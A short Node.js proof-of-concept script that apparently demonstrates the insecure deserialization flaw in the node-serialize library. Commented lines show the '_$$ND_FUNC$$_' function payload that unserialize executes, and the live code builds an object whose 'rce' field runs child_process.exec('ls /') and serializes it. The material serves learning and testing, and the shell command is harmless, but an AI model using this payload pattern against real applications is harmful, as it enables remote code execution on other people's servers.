var serialize = require('node-serialize');

// var m = {
// 	myOutput: function() {
// 		return 'Hello';
// 	}
// }

// console.log("Serialized: \n" + serialize.serialize(m) + "\n");

// var km = {
// 	"username": "_$$ND_FUNC$$_function(){ return 'Hello'; }()",
// 	"gender": "Male",
// 	"Age": 40
// };
// console.log(serialize.unserialize(km));

var y = {
    rce : function(){
    require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });
    }(),
    }
    var serialize = require('node-serialize');
    console.log("Serialized: \n" + serialize.serialize(y));